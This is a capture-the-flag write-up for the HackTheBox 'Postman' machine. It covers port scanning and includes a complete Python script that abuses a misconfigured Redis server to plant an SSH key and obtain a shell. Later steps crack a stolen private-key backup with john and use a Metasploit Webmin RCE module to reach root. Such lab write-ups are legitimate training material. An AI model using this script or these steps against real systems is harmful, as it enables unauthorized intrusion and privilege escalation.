## Postman by sAINT_barber
---

This is a write up for the Postman machine on HackTheBox.eu

This is a general idea of the machine.

![alt text][image1]

First we run a simple nmap scan with the command `nmap -sC -sV 10.10.10.160` on the machines IP

![alt text][image2]

We dont get much to work with, but port 80 is open, and port 10000 looks interesting.
First lets check the website on port 80.

![alt text][image3]

Theres nothing interesting on the website, lets now have a look at port 10000
After trying to access port 10000 we come to a page that tells us to use https://Postman:10000.

![alt text][image4]

Lets update our /etc/hosts file and add Postman to use the ip 10.10.10.160

![alt text][image5]

Now lets go to https://postman:10000

![alt text][image6]

Looks like its the login page for the webmin dashboard.
We can try default passwords like admin:admin or admin:password but no luck there.
Next we can run searchsploit to check for any exploits on webmin version 1.910

![alt text][image7]

Looks like we have an authenticated remote code execution exploit.
But to run this exploit we need to be logged in to the webmin dashboard, we will probably need this
exploit for our privilege escalation later on.
Since we dont have a username and password to log in we are pretty much stuck, lets try and run nmap
again and see if we missed any open ports.
Now i tried the command `nmap -p1000-10000 -T4 10.10.10.160` to scan the port range of 1000-10000
Looks like we did miss a port in the first nmap scan. Port 6379, after some googling i found that
this port is for redis.

![alt text][image8]

After some more googling, there is a vulnerability for this redis version.
We can connect to the machine via the redis port with the `redis-cli` command, after connecting we can
write to redis' .ssh folder an update the authorized_key file with our own ssh public key, and then
connect to the machine via ssh with the redis username.
I found a simple script online that does all the required commands and connects with ssh.

*redis.py*

`#!/usr/bin/python
#Author : Avinash Kumar Thapa aka -Acid
#Twitter : https://twitter.com/m_avinash143
#####################################################################################################################################################

import os
import os.path
from sys import argv
from termcolor import colored


script, ip_address, username = argv


PATH='/usr/bin/redis-cli'
PATH1='/usr/local/bin/redis-cli'

def ssh_connection():
	shell = "ssh -i " + '$HOME/.ssh/id_rsa ' + username+"@"+ip_address
	os.system(shell)

if os.path.isfile(PATH) or os.path.isfile(PATH1):
	try:
    		print colored('\t*******************************************************************', "green")
    		print colored('\t* [+] [Exploit] Exploiting misconfigured REDIS SERVER*' ,"green")
    		print colored('\t* [+] AVINASH KUMAR THAPA aka "-Acid"                                ', "green")
		print colored('\t*******************************************************************', "green")
		print "\n"
		print colored("\t SSH Keys Need to be Generated", 'blue')
		os.system('ssh-keygen -t rsa -C \"acid_creative\"')
		print colored("\t Keys Generated Successfully", "blue")
		os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') > $HOME/.ssh/public_key.txt")
		cmd = "redis-cli -h " + ip_address + ' flushall'
		cmd1 = "redis-cli -h " + ip_address
		os.system(cmd)
		cmd2 = "cat $HOME/.ssh/public_key.txt | redis-cli -h " +  ip_address + ' -x set cracklist'
		os.system(cmd2)
		cmd3 = cmd1 + ' config set dbfilename "backup.db" '
		cmd4 = cmd1 + ' config set  dir' + " /home/"+username+"/.ssh/"
		cmd5 = cmd1 + ' config set dbfilename "authorized_keys" '
		cmd6 = cmd1 + ' save'
		os.system(cmd3)
		os.system(cmd4)
		os.system(cmd5)
		os.system(cmd6)
		print colored("\tYou'll get shell in sometime..Thanks for your patience", "green")
		ssh_connection()

	except:
		print "Something went wrong"
else:
	print colored("\tRedis-cli:::::This utility is not present on your system. You need to install it to proceed further.", "red")
`
Now we can run the command `python redis.py 10.10.10.160 redis`

![alt text][image8]

And there you go, we now have a shell on the box as redis, lets have a look at the home folder.

![alt text][image10]

We have found a user named Matt, this could be a possible username for the webmin login page.
Looks like we can't view the contents of user.txt
Lets keep on enumerating the machine until we find something interesting.
After some enumeration i tried `find / -type f -name *.bak 2>/dev/null` to view all backup files on the machine.

![alt text][image11]

Good! We found a backup file of Matt's ssh private key! Lets use this to connect to the machine as Matt.

![alt text][image12]

Okay, the id_rsa.bak file is password protected. First i started a simple http serer on the victims machine with `python3 -m http.server` and then used `wget http://10.10.10.160:8000/id_rsa.bak` to download the private key to my machine so i can crack the password.

![alt text][image13]

We can use `ssh2john` and save the output to a file, in my case i named it crackme. And then we can use `john` with the rockyou.txt to crack the password.

![alt text][image14]

Boom! We got the password `computer2008`, lets try and connect with ssh again.

![alt text][image15]

Well, the password is correct, but whenever we try and connect the connection closes.
Lets try and use our user Matt and the password computer2008 to login to the webmin dashboard we found earlier.

![alt text][image16]

Voila, we have logged in to the dashboard, now lets fire up metasploit and try an run the exploit for this webmin version that we found before. We will be using the `linux/http/webmin_packageup_rce` module.

![alt text][image17]

Lets provide the RHOSTS: 10.10.10.160, USERNAME: Matt, PASSWORD: computer2008, LHOST: {your openvpn ip} and dont forget that the web server is running in SSL mode so we have to set SSL: true.
Now lets run `exploit`

![alt text][image18]

ROOTED! Now we can read the root.txt password and user.txt password.

![alt text][image19]

Thanks for reading, this is my first hackthebox writeup so any kind of feedback will be appreciated.

*Note: Instead of trying to use ssh to connect to user with Matt:computer2008, we can simply execute su Matt as redis and provide the password there to get the user.txt flag*

[image1]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image1.png
[image2]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image2.png
[image3]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image3.png
[image4]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image4.png
[image5]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image5.png
[image6]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image6.png
[image7]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image7.png
[image8]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image8.png
[image9]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image9.png
[image10]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image10.png
[image11]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image11.png
[image12]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image12.png
[image13]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image13.png
[image14]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image14.png
[image15]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image15.png
[image16]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image16.png
[image17]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image17.png
[image18]: https://raw.githubusercontent.com/CYberMouflons/ctf-writeups/master/HackTheBox/Postman/images/image18.png
